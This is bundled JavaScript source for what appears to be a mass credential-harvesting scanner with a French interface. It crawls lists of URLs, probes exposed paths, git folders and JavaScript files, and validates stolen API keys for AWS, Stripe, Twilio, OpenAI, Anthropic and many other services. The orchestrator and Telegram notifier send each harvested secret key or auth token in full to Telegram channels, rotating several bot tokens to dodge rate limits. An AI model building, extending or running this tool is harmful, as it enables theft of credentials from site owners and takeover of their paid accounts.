    const sid = hit.validationMeta?.accountSid || hit.matches.find((m) => /^AC[0-9a-fA-F]{32}$/.test(m.value))?.value || "";
    const tok = hit.validationMeta?.authToken || hit.matches.find((m) => /^[0-9a-fA-F]{32}$/.test(m.value) && !/^AC|^SK/.test(m.value))?.value || primaryValue(hit);
    const lines = [];
    if (sid) lines.push(`\u{1F194} ${b("Account SID:")}`, code(sid));
    lines.push(`\u{1F511} ${b("Auth Token:")}`, code(tok), "");
    return lines;
  }
  if (svc === "stripe") {
    return [`\u{1F511} ${b("Secret Key:")}`, code(primaryValue(hit)), ""];
  }
  return [keyHeader(ui.keyLabel), code(primaryValue(hit)), ""];
}
function keyHeader(label) {
  const m = label.match(/^(\S+)\s+(.+)$/);
  if (!m) return esc(label);
  return `${m[1]} ${b(m[2])}`;
}
function formatHit(hit, n = 1, now = /* @__PURE__ */ new Date()) {
  const svc = hit.matches[0]?.service ?? "unknown";
  const { light, line } = statusBanner(hit);
  const compactInvalid = hit.validationStatus === "invalid" && hit.validationMeta?.statusKind !== "test-key" && hit.validationMeta?.statusKind !== "zero-perm";
  if (isRawGeneric(hit)) {
    const label = SERVICE_UI[svc]?.keyLabel ?? "\u{1F511} Token:";
    const value = primaryValue(hit);
    return [
      BRAND,
      SEP,
      "",
      `\u{1F7E1} ${b(`HIT #${n} \u2014 ${svc.toUpperCase()}`)} (non valid\xE9)`,
      "",
      ...urlBlock(hit, false),
      value ? `${esc(label)}
${code(value)}` : "",
      `\u23F1\uFE0F ${stamp2(now)}`
    ].filter((x) => x !== void 0).join("\n");
  }
  const klaviyo = svc === "klaviyo" && hit.validationStatus === "valid";
  return [
    BRAND,
    SEP,
    "",
    `${light} ${b(`HIT #${n} \u2502 ${serviceTitle(hit)}`)}`,
    b(line),
    "",
    ...klaviyo ? extraBlock(hit) : urlBlock(hit, compactInvalid),
    ...klaviyo ? urlBlock(hit, false) : credentialBlock(hit),
    ...klaviyo ? credentialBlock(hit) : extraBlock(hit),
    `\u23F1\uFE0F ${stamp2(now)}`
  ].join("\n");
}
function formatStats(stats, now = /* @__PURE__ */ new Date()) {
  const total = stats.urlsTotal ?? 0;
  const done = stats.urlsProcessed;
  const remaining2 = Math.max(0, total - done);
  const pct = total > 0 ? done / total * 100 : stats.done ? 100 : 0;
  const elapsedMs = Math.max(0, now.getTime() - (stats.startedAt ?? now.getTime()));
  const cpm = Math.round(stats.cpm);
  const eta = remaining2 > 0 && cpm > 0 ? hms(remaining2 / cpm * 6e4) : "N/A";
  const hits = stats.hitsValid + stats.hitsInvalid + stats.hitsRaw;
  const heading = stats.done ? "\u{1F3C6} SCAN TERMIN\xC9 \u{1F3C6}" : "\u{1F3F4} SCAN EN COURS \u{1F3F4}";
  const breakdown = Object.entries(stats.byService).sort((a, b2) => b2[1] - a[1]).map(([k, v]) => `${statLabel(k)}: ${code(String(v))}`).join("\n");
  const clock = new Intl.DateTimeFormat("fr-FR", {
    timeZone: "Europe/Paris",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  }).format(now);
  const empty = breakdown || "<i>Aucun hit pour le moment...</i>";
  return [
    BRAND,
    heading,
    "",
    `\u{1F4CB} <i>Fichier:</i> ${code(stats.fileName ?? "scan")}`,
    "",
    b("\u{1F4CA} PROGRESSION"),
    `\u{1F522} <i>Trait\xE9es:</i> ${code(String(done))}`,
    `\u23F3 <i>Restantes:</i> ${code(String(remaining2))}`,
    `\u{1F4C8} <i>Avancement:</i> ${code(`${pct.toFixed(1)}%`)}`,
    `${progressBar(pct)} ${code(`${pct.toFixed(1)}%`)}`,
    "",
    b("\u23F1\uFE0F PERFORMANCE"),
    `\u{1F550} <i>Temps:</i> ${code(hms(elapsedMs))}`,
    `\u{1F3AF} <i>ETA:</i> ${code(eta)}`,
    `\u26A1 <i>CPM:</i> ${code(String(cpm))}`,
    "",
    b("\u{1F3AF} HITS D\xC9TECT\xC9S"),
    `\u{1F4A0} ${b("Total:")} ${code(String(hits))} <i>(sans doublons)</i>`,
    "",
    breakdown ? `${b("\u{1F4CA} R\xC9PARTITION:")}
${breakdown}` : empty,
    "",
    `\u23F1\uFE0F <i>Mise \xE0 jour:</i> ${code(clock)}`
  ].join("\n");
}
function progressBar(pct) {
  const filled = Math.round(Math.min(100, Math.max(0, pct)) / 5);
  return code("\u2588".repeat(filled) + "\u2591".repeat(20 - filled));
}
function hms(ms) {
  const s = Math.max(0, Math.floor(ms / 1e3));
  const h = Math.floor(s / 3600);
  const m = Math.floor(s % 3600 / 60);
  const sec = s % 60;
  const p = (n) => String(n).padStart(2, "0");
  return `${p(h)}:${p(m)}:${p(sec)}`;
}
function statLabel(service) {
  const labels = {
    aws: "\u2601\uFE0F AWS",
    sendgrid: "\u{1F48C} SendGrid",
    brevo: "\u{1F4E8} Brevo",
    smtp: "\u2709\uFE0F SMTP",
    stripe: "\u{1F48E} Stripe",
    github: "\u{1F419} GitHub",
    mailgun: "\u{1F52B} Mailgun",
    newmailgun: "\u{1F52B} Mailgun",
    zoho: "\u{1F534} Zoho CRM",
    azure: "\u{1F511} Azure",
    salesforce: "\u2601\uFE0F Salesforce",
    monday: "\u{1F4CA} Monday",
    klaviyo: "\u2709\uFE0F Klaviyo",
    gitlab: "\u{1F98A} GitLab",
    bitbucket: "\u{1FAA3} Bitbucket",
    gitbucket: "\u{1FAA3} GitBucket",
    openai: "\u{1F916} OpenAI",
    anthropic: "\u{1F7E3} Anthropic",
    groq: "\u26A1 Groq",
    huggingface: "\u{1F917} HuggingFace",
    openrouter: "\u{1F9ED} OpenRouter",
    perplexity: "\u{1F52E} Perplexity",
    xai: "\u{1D54F} xAI",
    mistral: "\u{1F32C}\uFE0F Mistral",
    together: "\u{1F91D} Together",
    fireworks: "\u{1F386} Fireworks",
    deepseek: "\u{1F40B} DeepSeek",
    cohere: "\u{1F7E0} Cohere",
    voyage: "\u{1F9ED} Voyage",
    replicate: "\u{1F9EA} Replicate",
    nvidia: "\u{1F7E2} NVIDIA",
    twilio: "\u{1F4F1} Twilio",
    postmark: "\u{1F4E9} Postmark",
    sparkpost: "\u26A1 Sparkpost",
    react2shell: "\u{1F4A3} React2Shell"
  };
  return labels[service] ?? `\u{1F511} ${service}`;
}
function safeHtmlTruncate(msg, maxLen = 4e3) {
  if (msg.length <= maxLen) return msg;
  let truncated = msg.slice(0, maxLen);
  const openTags = [];
  let i = 0;
  while (i < truncated.length) {
    if (truncated[i] !== "<") {
      i++;
      continue;
    }
    const end = truncated.indexOf(">", i);
    if (end < 0) {
      truncated = truncated.slice(0, i);
      break;
    }
    const tag = truncated.slice(i + 1, end);
    if (tag.startsWith("/")) {
      openTags.pop();
    } else {
      const tagName = tag.split(/\s+/)[0];
      if (tagName && tagName !== "br" && tagName !== "hr") openTags.push(tagName);
    }
    i = end + 1;
  }
  for (let j = openTags.length - 1; j >= 0; j--) truncated += `</${openTags[j]}>`;
  return `${truncated}

\u26A0\uFE0F [Message tronqu\xE9]`;
}

// packages/notifier-telegram/src/index.ts
var TelegramNotifier = class {
  constructor(config, logger) {
    this.config = config;
    this.logger = logger;
    this.pool = new TelegramBotPool(collectBotTokens(this.cfg()));
  }
  config;
  logger;
  statsMessageId = null;
  statsBotToken = null;
  lastEdit = 0;
  updating = false;
  hitNo = 0;
  pool;
  async startScan(label) {
    this.hitNo = 0;
    this.lastEdit = 0;
    this.statsMessageId = null;
    this.statsBotToken = null;
    this.pool = new TelegramBotPool(collectBotTokens(this.cfg()));
    const text = formatStats({
      fileName: label,
      urlsProcessed: 0,
      hitsValid: 0,
      hitsInvalid: 0,
      hitsRaw: 0,
      byService: {},
      cpm: 0,
      startedAt: Date.now()
    });
    const sent = await this.send(this.cfg().statsChannelId, text);
    this.statsMessageId = sent?.id ?? null;
    this.statsBotToken = sent?.token ?? null;
  }
  async updateProgress(stats) {
    if (this.updating) return;
    const now = Date.now();
    if (now - this.lastEdit < 15e3) return;
    this.updating = true;
    this.lastEdit = now;
    try {
      await this.syncStats(formatStats(stats), false);
    } finally {
      this.updating = false;
    }
  }
  async sendHit(hit) {
    await this.send(hitChannelId(hit, this.cfg()), formatHit(hit, ++this.hitNo));
  }
  async sendFinalStats(stats) {
    await this.syncStats(formatStats({ ...stats, done: true }), true);
  }
  /** After the first SCAN EN COURS, only edit that message — never send a new one. */
  async syncStats(text, force) {
    const chat = this.cfg().statsChannelId;
    if (this.statsMessageId && this.statsBotToken) {
      await this.edit(chat, this.statsMessageId, text, this.statsBotToken);
      return;
    }
    if (!force && this.statsMessageId) return;
    const sent = await this.send(chat, text);
    this.statsMessageId = sent?.id ?? this.statsMessageId;
    this.statsBotToken = sent?.token ?? this.statsBotToken;
  }
  cfg() {
    return this.config.get().telegram;
  }
  async send(chatId, text) {
    if (!this.pool.size() || !chatId) {
      this.logger.warn("TELEGRAM", "missing botTokens/channel \u2014 skip send");
      return null;
    }
    const attempts = Math.max(3, this.pool.size() * 2);
    for (let i = 0; i < attempts; i++) {
      const token = this.pool.nextReady();
      if (!token) break;
      try {
        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: safeHtmlTruncate(text),
            parse_mode: "HTML",
            disable_web_page_preview: true
          })
        });
        if (res.status === 429) {
          const body = await res.json().catch(() => ({}));
          const wait = parseRetryAfter(body, 1 + i);
          this.pool.markCooling(token, wait);
          this.logger.warn("TELEGRAM", `429 bot #${this.pool.indexOf(token) + 1} \u2014 rotate (${wait}s)`);
          continue;
        }
        if (!res.ok) {
          this.logger.warn("TELEGRAM", `send HTTP ${res.status} bot #${this.pool.indexOf(token) + 1}`);
          continue;
        }
        const json7 = await res.json();
        const id = json7.result?.message_id;
        if (id == null) return null;
        return { id, token };
      } catch (err) {
        this.logger.warn("TELEGRAM", `send failed ${err.message}`);
      }
    }
    return null;
  }
  async edit(chatId, messageId, text, token) {
    try {
      const res = await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text: safeHtmlTruncate(text),
          parse_mode: "HTML",
          disable_web_page_preview: true
        })
      });
      if (res.status === 429) {
        const body2 = await res.json().catch(() => ({}));
        this.pool.markCooling(token, parseRetryAfter(body2, 2));
        this.logger.warn("TELEGRAM", "edit 429 \u2014 keep same stats message");
        return false;
      }
      if (res.ok) return true;
      const body = await res.json().catch(() => ({}));
      const desc = body.description ?? "";
      if (res.status === 400 && /not modified/i.test(desc)) return true;
      this.logger.warn("TELEGRAM", `edit HTTP ${res.status} ${desc.slice(0, 80)}`);
      return false;
    } catch (err) {
      this.logger.warn("TELEGRAM", `edit failed ${err.message}`);
      return false;
    }
  }
};

// packages/orchestrator/src/orchestrator.ts
init_src();
import { mkdir, readdir as readdir2, rename } from "node:fs/promises";
import { basename, join as join2, resolve as resolve3 } from "node:path";
import { writeFileSync } from "node:fs";
import { setMaxListeners as setMaxListeners2 } from "node:events";

// packages/orchestrator/src/url-stream.ts
init_src();
import { createReadStream, existsSync, readFileSync as readFileSync3 } from "node:fs";
import { createInterface } from "node:readline";
async function* streamUrlFile(file, excluded, seen) {
  const rl = createInterface({ input: createReadStream(file, { encoding: "utf8" }), crlfDelay: Infinity });
  for await (const line of rl) {
    const norm = normalizeScanUrl(line);
    if (!norm) continue;
    if (excluded.has(norm) || excluded.has(line.trim())) continue;
    const h = hashUrl(norm);
    if (seen.has(h)) continue;
    seen.add(h);
    yield norm;
  }
}
async function countUrlFile(file, _excluded) {
  const rl = createInterface({ input: createReadStream(file, { encoding: "utf8" }), crlfDelay: Infinity });
  let n = 0;
  for await (const line of rl) {
    const s = line.trim();
    if (s && !s.startsWith("#")) n++;
  }
  return n;
}
function loadExcluded(file) {
  if (!existsSync(file)) return /* @__PURE__ */ new Set();
  const set = /* @__PURE__ */ new Set();
  for (const line of readFileSync3(file, "utf8").split(/\r?\n/)) {
    const n = normalizeScanUrl(line);
    if (n) set.add(n);
    if (line.trim()) set.add(line.trim());
  }
  return set;
}

// packages/orchestrator/src/pipeline.ts
var AsyncPipeline = class {
  constructor(concurrency, handler, queueCap = concurrency * 8) {
    this.concurrency = concurrency;
    this.handler = handler;
    this.queueCap = queueCap;
    this.activeWorkers = concurrency;
    for (let i = 0; i < concurrency; i++) {
      void this.runWorker();
    }
  }
  concurrency;
  handler;
  queueCap;
  queue = [];
  /** Callbacks waiting for space in the queue (back-pressure). */
  pushWaiters = [];
  /** Callbacks waiting for the queue to become non-empty (workers). */
  popWaiters = [];
  activeWorkers;
  _done = 0;
  _total = 0;
  closed = false;
  /** Resolvers waiting for the pipeline to fully drain. */
  drainWaiters = [];
  /** Total items pushed so far. */
  get total() {
    return this._total;
  }
  /** Items fully processed. */
  get done() {
    return this._done;
  }
  /** Items currently waiting in the queue. */
  get pending() {
    return this.queue.length;
  }
  /** Items actively being processed by workers. */
  get active() {
    return this._total - this._done - this.queue.length;
  }
  /**
   * Push an item into the pipeline.
   * Suspends if the queue is at capacity (back-pressure) until a worker
   * picks up an item and makes room.
   */
  async push(item) {
    if (this.closed) throw new Error("AsyncPipeline: push() called after drain()");
    if (this.popWaiters.length > 0) {
      const resolve5 = this.popWaiters.shift();
      this._total++;
      resolve5(item);
      return;
    }
    if (this.queue.length >= this.queueCap) {
      await new Promise((resolve5) => {
        this.pushWaiters.push(resolve5);
      });
    }
    this._total++;
    this.queue.push(item);
  }
  /**
   * Signal that no more items will be pushed, then wait until all items
   * have been fully processed.
   */
  async drain() {
    this.closed = true;
    for (const resolve5 of this.popWaiters.splice(0)) {
      resolve5(void 0);
    }
    if (this._done === this._total && this.activeWorkers === 0) return;
    await new Promise((resolve5) => {
      this.drainWaiters.push(resolve5);
    });
  }
  // -------------------------------------------------------------------------
  // Internal
  // -------------------------------------------------------------------------
  async runWorker() {
    for (; ; ) {
      const item = await this.pop();
      if (item === void 0) break;
      try {
        await this.handler(item);
      } catch {
      } finally {
        this._done++;
        this.checkDrain();
      }
    }
    this.activeWorkers--;
    this.checkDrain();
  }
  /**
   * Pop the next item. Suspends the worker if the queue is empty.
   * Returns `undefined` when the pipeline is closed and drained.
   */
  pop() {
    if (this.queue.length > 0) {
      const item = this.queue.shift();
      if (this.pushWaiters.length > 0) {
        const resolve5 = this.pushWaiters.shift();
        resolve5();
      }
      return Promise.resolve(item);
    }
    if (this.closed) return Promise.resolve(void 0);
    return new Promise((resolve5) => {
      this.popWaiters.push((item) => {
        if (this.pushWaiters.length > 0) {
          this.pushWaiters.shift()();
        }
        resolve5(this.closed && item === void 0 ? void 0 : item);
      });
    });
  }
  checkDrain() {
    if (this._done === this._total && (this.closed || this.activeWorkers === 0)) {
      for (const resolve5 of this.drainWaiters.splice(0)) {
        resolve5();
      }
    }
  }
};

// packages/orchestrator/src/orchestrator.ts
var Orchestrator = class {
  constructor(config, http, analyzer, modules, validator, notifier, dedup, bus, logger) {
    this.config = config;
    this.http = http;
    this.analyzer = analyzer;
    this.modules = modules;
    this.validator = validator;
    this.notifier = notifier;
    this.dedup = dedup;
    this.bus = bus;
    this.logger = logger;
    this.bus.on("hit.validated", ({ hit }) => {
      if (hit.validationStatus === "valid") this.stats.hitsValid++;
      else if (hit.validationStatus === "invalid") this.stats.hitsInvalid++;
      else this.stats.hitsRaw++;
      const svc = hit.matches[0]?.service;
      if (svc) {
        const key = svc === "newmailgun" ? "mailgun" : svc;
        this.stats.byService[key] = (this.stats.byService[key] ?? 0) + 1;
      }
    });
  }
  config;
  http;
  analyzer;
  modules;
  validator;
  notifier;
  dedup;
  bus;
  logger;
  urlsProcessed = 0;
  startedAt = Date.now();
  /** Per-file cache of origin probes: `${origin}/` is fetched once per origin, not once per URL. */
  originProbe = /* @__PURE__ */ new Map();
  stats = {
    urlsProcessed: 0,
    hitsValid: 0,
    hitsInvalid: 0,
    hitsRaw: 0,
    byService: {},
    cpm: 0
  };
  async scanCheckFolder() {
    const cfg = this.config.get();
    await mkdir(cfg.checkDir, { recursive: true });
    await mkdir(cfg.doneDir, { recursive: true });
    await mkdir(cfg.dataDir, { recursive: true });
    const files = (await readdir2(cfg.checkDir)).filter((f) => f.toLowerCase().endsWith(".txt"));
    if (!files.length) {
      this.logger.warn("ORCH", `no .txt files in ${cfg.checkDir}`);
      return;
    }
    for (const file of files) {
      const full = resolve3(cfg.checkDir, file);
      await this.scanFile(full);
      await rename(full, join2(cfg.doneDir, basename(file)));
      this.logger.info("ORCH", `moved ${file} \u2192 Done/`);
    }
  }
  async scanFile(file) {
    const cfg = this.config.get();
    this.dedup.reset("url");
    this.dedup.reset("url-run");
    this.dedup.reset("path-origin");
    this.dedup.reset("js");
    this.dedup.reset("git-site");
    this.dedup.reset("svn-site");
    this.dedup.reset("hg-site");
    this.dedup.reset("recon-origin");
    this.dedup.reset("recon-ep");
    this.dedup.reset("vuln-origin");
    this.dedup.reset("map");
    this.dedup.reset("hit");
    this.originProbe.clear();
    const excluded = loadExcluded(resolve3(cfg.excludedUrlsFile));
    const seen = /* @__PURE__ */ new Set();
    this.urlsProcessed = 0;
    this.startedAt = Date.now();
    this.stats = {
      urlsProcessed: 0,
      hitsValid: 0,
      hitsInvalid: 0,
      hitsRaw: 0,
      byService: {},
      cpm: 0,
      fileName: basename(file),
      startedAt: this.startedAt
    };
    this.stats.urlsTotal = await countUrlFile(file, excluded);
    await this.notifier.startScan(basename(file));
    const ticker = setInterval(() => {
      void this.notifier.updateProgress(this.snapshot());
    }, 15e3);
    const queueCap = cfg.concurrency.pipelineQueueCap ?? cfg.concurrency.urlWorkers * 8;
    const pipeline = new AsyncPipeline(
      cfg.concurrency.urlWorkers,
      async (url) => {
        try {
          await this.processUrl(url);
        } catch (err) {
          this.logger.error("ORCH", `url panic ${url}: ${err.message}`);
        }
        this.urlsProcessed++;
        this.stats.urlsProcessed = this.urlsProcessed;
      },
      queueCap
    );
    try {
      for await (const url of streamUrlFile(file, excluded, seen)) {
        await pipeline.push(url);
      }
      await pipeline.drain();
      await this.validator.drain();
      await new Promise((r) => setTimeout(r, 80));
      await this.validator.drain();
    } finally {
      clearInterval(ticker);
    }
    this.persist();
    await this.notifier.sendFinalStats({ ...this.snapshot(), done: true });
    this.logger.info("ORCH", `file done ${basename(file)} urls=${this.urlsProcessed}`);
  }
  async processUrl(rawUrl) {
    if (!this.dedup.checkAndMark("url-run", hashUrl(rawUrl))) return;
    const origin = originOf(rawUrl);
    const ac = new AbortController();
    setMaxListeners2(64, ac.signal);
    const budget = this.config.resolveBudget("laneBudget");
    const timer = setTimeout(() => ac.abort(), budget);
    const ctx = {
      rawUrl,
      origin,
      signal: ac.signal,
      emit: (hit) => this.acceptHit(hit)
    };
    try {
      let probe = this.originProbe.get(origin);
      if (!probe) {
        probe = await this.probeOrigin(origin, ac.signal);
        if (!probe.dead) {
          this.originProbe.set(origin, probe);
          if (probe.origin && probe.origin !== origin) this.originProbe.set(probe.origin, probe);
        }
      }
      if (probe.dead) return;
      if (probe.origin) ctx.origin = probe.origin;
      const enabled = this.config.get();
      const git = this.modules.filter((m) => m.name === "git" && m.isEnabled(enabled));
      const pathMods = this.modules.filter((m) => m.name === "paths" && m.isEnabled(enabled));
      ctx.pageContent = probe.home;
      const runContent = async () => {
        if (!ctx.pageContent) ctx.pageContent = await this.fetchHome(rawUrl, ac.signal);
        if (ctx.pageContent) {
          const home = this.analyzer.analyze({ url: rawUrl, content: ctx.pageContent });
          if (!home.rejected && home.matches.length) {
            this.acceptHit({
              source: "homepage",
              url: rawUrl,
              origin: ctx.origin,
              matches: home.matches,
              contentSnippet: home.text.slice(0, 1500)
            });
          }
        }
        const content = this.modules.filter(
          (m) => m.phase === "content" && m.isEnabled(enabled) && (!m.requiresPage || !!ctx.pageContent)
        );
        await Promise.all(content.map((m) => this.runModule(m, ctx)));
        ctx.pageContent = void 0;
        const post = this.modules.filter((m) => m.phase === "post" && m.isEnabled(enabled));
        await Promise.all(post.map((m) => this.runModule(m, ctx)));
      };
      await Promise.all([
        Promise.all(pathMods.map((m) => this.runModule(m, ctx))),
        Promise.all(git.map((m) => this.runModule(m, ctx))),
        runContent()
      ]);
    } finally {
      clearTimeout(timer);
    }
  }
  async runModule(mod, ctx) {
    try {
      const gen = mod.scan(ctx);
      if (gen && typeof gen.next === "function") {
        for await (const hit of gen) {
          this.acceptHit(hit);
        }
      }
    } catch (err) {
      this.logger.error(mod.name.toUpperCase(), `engine failed: ${err.message}`);
    }
  }
  async fetchHome(url, signal) {
    for (const u of homepageVariants(url)) {
      try {
        const res = await this.http.get(u, { signal, budget: "pathProbe" });
        if (res.status >= 200 && res.status < 400 && res.text) {
          const a = this.analyzer.analyze({ url: u, content: res.text });
          if (!a.rejected) return a.text || res.text;
        }
      } catch {
        continue;
      }
    }
    return void 0;
  }
  async probeOrigin(origin, signal) {
    const first = await this.tryOriginHome(`${origin}/`, signal, "pathProbe");
    if (first.live) return { dead: false, origin: first.origin ?? origin, home: first.home };
    if (first.dead) return { dead: true };
    if (first.tlsHandshake && origin.startsWith("https:")) {
      const httpHome = httpsToHttpDefaultPort(`${origin}/`);
      if (httpHome !== `${origin}/`) {
        const viaHttp = await this.tryOriginHome(httpHome, signal, "pathProbe");
        if (viaHttp.live) return { dead: false, origin: viaHttp.origin ?? originOf(httpHome), home: viaHttp.home };
      }
      return { dead: true };
    }
    const retry = await this.tryOriginHome(`${origin}/`, signal, "pathSlow");
    if (retry.live) return { dead: false, origin: retry.origin ?? origin, home: retry.home };
    return { dead: true };
  }
  async tryOriginHome(url, signal, budget) {
    try {
      const res = await this.http.get(url, { signal, budget });
      let home;
      if (res.status >= 200 && res.status < 400 && res.text) {
        const a = this.analyzer.analyze({ url: res.url, content: res.text });
        if (!a.rejected) home = a.text || res.text;
      }
      return { live: true, dead: false, origin: originOf(res.url), home };
    } catch (err) {
      if (isDeadHostError(err)) return { live: false, dead: true };
      if (isTlsHandshakeError(err)) return { live: false, dead: false, tlsHandshake: true };
      if (isUnreachableError(err)) return { live: false, dead: false };
      return { live: false, dead: false };
    }
  }
  acceptHit(hit) {
    if (!hit.matches.length) return;
    const keys = credentialFingerprints(hit);
    if (!keys.length) return;
    const fresh = keys.filter((k) => this.dedup.checkAndMark("hit", k));
    if (!fresh.length) return;
    this.validator.submit(hit);
  }
  snapshot() {
    const mins = Math.max(0.01, (Date.now() - this.startedAt) / 6e4);
    return {
      ...this.stats,
      byService: { ...this.stats.byService },
      cpm: this.urlsProcessed / mins,
      urlsProcessed: this.urlsProcessed,
      fileName: this.stats.fileName,
      startedAt: this.startedAt
    };
  }
  persist() {
    const dir = this.config.get().dataDir;
    try {
      writeFileSync(join2(dir, "hit-counter.json"), JSON.stringify(this.snapshot(), null, 2));
    } catch (err) {
      this.logger.warn("ORCH", `persist ${err.message}`);
    }
  }
};

// packages/orchestrator/src/index.ts
import { join as join3 } from "node:path";
async function bootstrap(configPath, packagesRoot, workers) {
  const container = new Container();
  registerCore(container, configPath);
  container.registerSingleton(TOKENS.Analyzer, (c) => new ContentAnalyzer(c.resolve(TOKENS.Config)));
  container.registerSingleton(
    TOKENS.Notifier,
    (c) => new TelegramNotifier(c.resolve(TOKENS.Config), c.resolve(TOKENS.Logger))
  );
  container.registerSingleton(
    TOKENS.Validator,
    (c) => {
      const config = c.resolve(TOKENS.Config);
      const cfg = config.get();
      return new ValidatorService(
        c.resolve(TOKENS.Http),
        c.resolve(TOKENS.Notifier),
        c.resolve(TOKENS.EventBus),
        c.resolve(TOKENS.Logger),
        cfg.concurrency.validatorWorkers,
        [],
        join3(cfg.dataDir, "seen_keys.json"),
        config.resolveBudget("smtpAuth")
      );
    }
  );
  const logger = container.resolve(TOKENS.Logger);
  if (workers != null && workers > 0) {
    const cfg = container.resolve(TOKENS.Config).get();
    cfg.concurrency.urlWorkers = workers;
  }
  const registry = new ModuleRegistry(logger);
  const pathLimiter = new Semaphore(container.resolve(TOKENS.Config).get().concurrency.pathProbeGlobal ?? 240);
  const deps = {
    http: container.resolve(TOKENS.Http),
    analyzer: container.resolve(TOKENS.Analyzer),
    config: container.resolve(TOKENS.Config),
    dedup: container.resolve(TOKENS.Dedup),
    logger,
    pathLimiter
  };
  await registry.discover(packagesRoot, (Ctor) => {
    return new Ctor(deps);
  });
  if (!registry.modules.length) {
    const { default: Paths } = await Promise.resolve().then(() => (init_src3(), src_exports));
    const { default: Js } = await Promise.resolve().then(() => (init_src4(), src_exports2));
    const { default: Git } = await Promise.resolve().then(() => (init_src5(), src_exports3));
    const { default: Recon } = await Promise.resolve().then(() => (init_src6(), src_exports4));
    const { default: Vuln } = await Promise.resolve().then(() => (init_src7(), src_exports5));
    registry.register(new Paths(deps));
    registry.register(new Js(deps));
    registry.register(new Git(deps));
    registry.register(new Recon(deps));
    registry.register(new Vuln(deps));
  }
  return new Orchestrator(
    container.resolve(TOKENS.Config),
    container.resolve(TOKENS.Http),
    container.resolve(TOKENS.Analyzer),
    registry.modules,
    container.resolve(TOKENS.Validator),
    container.resolve(TOKENS.Notifier),
    container.resolve(TOKENS.Dedup),
    container.resolve(TOKENS.EventBus),
    logger
  );
}

// packages/cli/src/index.ts
setMaxListeners3(100);
function parseArgs() {
  const argv = process.argv.slice(2);
  const cmd = argv[0] ?? "start";
  if (cmd !== "start") {
    console.log("usage: scanner start [--workers N]");
    process.exit(1);
  }
  const root = process.cwd();
  const configPath = resolve4(root, process.env.SCANNER_CONFIG ?? "config/appsettings.json");
  let workers;
  for (let i = 1; i < argv.length; i++) {
    const arg = argv[i];
    if ((arg === "--workers" || arg === "-w") && argv[i + 1]) {
      const n = parseInt(argv[++i], 10);
      if (!Number.isNaN(n) && n > 0) workers = n;
    } else if (arg.startsWith("--workers=")) {
      const n = parseInt(arg.slice(10), 10);
      if (!Number.isNaN(n) && n > 0) workers = n;
    }
  }
  return { configPath, packagesRoot: resolve4(root, "packages"), workers };
}
async function main() {
  const { configPath, packagesRoot, workers } = parseArgs();
  const orch = await bootstrap(configPath, packagesRoot, workers);
  if (workers != null) {
    console.log(`[CLI] urlWorkers overridden \u2192 ${workers}`);
  }
  await orch.scanCheckFolder();
}
main().catch((err) => {
  console.error(err);
  process.exit(1);
});
